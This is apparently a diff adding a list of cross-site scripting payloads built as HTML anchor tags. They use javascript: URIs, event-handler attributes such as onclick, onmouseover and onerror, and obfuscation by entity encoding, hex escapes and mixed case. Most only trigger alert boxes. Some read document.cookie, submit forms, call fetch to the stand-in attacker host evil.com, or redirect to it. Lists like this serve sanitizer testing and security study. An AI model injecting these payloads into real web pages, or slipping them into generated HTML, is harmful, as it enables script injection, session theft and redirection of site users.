@@ -1,0 +1,84 @@
+<a href="javascript:alert('XSS')">Click me</a>
+<a href="#" onclick="alert('XSS')">Click me</a>
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click me</a>
+<a href="data:text/html,<script>alert('XSS')</script>">Click me</a>
+<a href="javascript:alert(String.fromCharCode(88,83,83))">Click me</a>
+<a href="#"><img src="x" onerror="alert('XSS')">Click me</a>
+<a href="#" onmouseover="alert('XSS')">Hover over me</a>
+<a href="javascript:void(alert('XSS'))">Click me</a>
+<a href="javascript:eval('alert(1)')">Click me</a>
+<a href="javascript:confirm('XSS')">Click me</a>
+<a href="javascript:prompt('XSS')">Click me</a>
+<a href="#" onclick="alert('XSS');return false;">Click me</a>
+<a href="javascript:document.forms[0].submit()">Click me</a>
+<a href="JaVaScRiPt:alert('XSS')">Click me</a>
+<a href="jAvAsCrIpT:alert('XSS')">Click me</a>
+<a href="javascript:alert(String.fromCharCode(88,83,83))">Click me</a>
+<a href="#" onfocus="alert('XSS')" tabindex="1">Focus on me</a>
+<a href="#"><img src="x" onerror="alert('XSS')">Click me</a>
+<a href="#" onmousedown="alert('XSS')">Click me</a>
+<a href="#" onmouseup="alert('XSS')">Click me</a>
+<a href="#" onkeydown="alert('XSS')">Press any key</a>
+<a href="#" onkeyup="alert('XSS')">Release the key</a>
+<a href="#" onkeypress="alert('XSS')">Press a key</a>
+<a href="javascript:\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29">Click me</a>
+<a href="javascript&#x3A;alert&#x28;&#x27;XSS&#x27;&#x29;">Click me</a>
+<a href="javascript://%0Aalert('XSS')">Click me</a>
+<a href="javascript:alert('XSS')#">Click me</a>
+<a href="javascript:alert(document.cookie)">Click me</a>
+<a href="javascript:alert(document.domain)">Click me</a>
+<a href="#" oncontextmenu="alert('XSS')">Right click me</a>
+<a href="javascript:window.onerror=alert;throw 'XSS'">Click me</a>
+<a href="#" ondblclick="alert('XSS')">Double click me</a>
+<a href="#" onfocus="alert('XSS')" tabindex="1">Focus on me</a>
+<a href="javascript:alert(/XSS/.source)">Click me</a>
+<a href="javascript:alert(document.location)">Click me</a>
+<a href="javascript:alert(navigator.userAgent)">Click me</a>
+<a href="javascript:alert(document.referrer)">Click me</a>
+<a href="javascript:alert(document.cookie)">Click me</a>
+<a href="javascript:alert(window.name)">Click me</a>
+<a href="javascript:alert(window.location.hash)">Click me</a>
+<a href="javascript:alert(screen.width)">Click me</a>
+<a href="javascript:alert(screen.height)">Click me</a>
+<a href="#" onblur="alert('XSS')">Blur me</a>
+<a href="#" onerror="alert('XSS')">Error me</a>
+<a href="javascript:alert('XSS')" onfocus="this.href='http://evil.com'">Focus me</a>
+<a href="#" onclick="alert(String.fromCharCode(88,83,83))">Click me</a>
+<a href="#" onmouseover="this.href='javascript:alert(\'XSS\')'">Hover me</a>
+<a href="#" onmousedown="this.href='javascript:alert(\'XSS\')'">Mouse down me</a>
+<a href="#" onmouseup="this.href='javascript:alert(\'XSS\')'">Mouse up me</a>
+<a href="#" ondblclick="this.href='javascript:alert(\'XSS\')'">Double click me</a>
+<a href="#" onmouseover="alert('XSS'); this.href='http://evil.com'">Hover and Click me</a>
+<a href="#" onmousedown="alert('XSS'); this.href='http://evil.com'">Mouse down and Click me</a>
+<a href="#" onmouseup="alert('XSS'); this.href='http://evil.com'">Mouse up and Click me</a>
+<a href="#" ondblclick="alert('XSS'); this.href='http://evil.com'">Double click and Click me</a>
+<a href="javascript:alert('Injected!')">Test Link 1</a>
+<a href="#" onclick="alert('Click me!')">Test Link 2</a>
+<a href="javascript:console.log('Log XSS')">Test Link 3</a>
+<a href="#" ondblclick="alert('Double Click XSS')">Test Link 4</a>
+<a href="javascript:fetch('http://evil.com')">Test Link 5</a>
+<a href="#" onmousedown="alert('Mouse Down XSS')">Test Link 6</a>
+<a href="#" onmouseup="alert('Mouse Up XSS')">Test Link 7</a>
+<a href="#" onfocus="alert('Focus XSS')" tabindex="1">Test Link 8</a>
+<a href="#" onblur="alert('Blur XSS')">Test Link 9</a>
+<a href="#" oncopy="alert('Copy XSS')">Test Link 10</a>
+<a href="javascript:document.write('XSS')">Test Link 11</a>
+<a href="#" oncut="alert('Cut XSS')">Test Link 12</a>
+<a href="#" onpaste="alert('Paste XSS')">Test Link 13</a>
+<a href="#" oncontextmenu="alert('Right Click XSS')">Test Link 14</a>
+<a href="#" ondrag="alert('Drag XSS')">Test Link 15</a>
+<a href="#" ondrop="alert('Drop XSS')">Test Link 16</a>
+<a href="#" ondragstart="alert('Drag Start XSS')">Test Link 17</a>
+<a href="#" ondragend="alert('Drag End XSS')">Test Link 18</a>
+<a href="#" onmouseover="alert('Mouse Over XSS')">Test Link 19</a>
+<a href="#" onmouseleave="alert('Mouse Leave XSS')">Test Link 20</a>
+<a href="#" onwheel="alert('Wheel XSS')">Test Link 21</a>
+<a href="#" onmouseenter="alert('Mouse Enter XSS')">Test Link 22</a>
+<a href="#" onsubmit="alert('Submit XSS')">Test Link 23</a>
+<a href="#" onreset="alert('Reset XSS')">Test Link 24</a>
+<a href="javascript:window.print()">Test Link 25</a>
+<a href="javascript:history.back()">Test Link 26</a>
+<a href="#" onclick="alert(document.cookie)">Test Link 27</a>
+<a href="#" onclick="alert(navigator.userAgent)">Test Link 28</a>
+<a href="javascript:document.location='http://evil.com'">Test Link 29</a>
+<a href="javascript:setTimeout('alert(\'XSS\')', 1000)">Test Link 30</a>
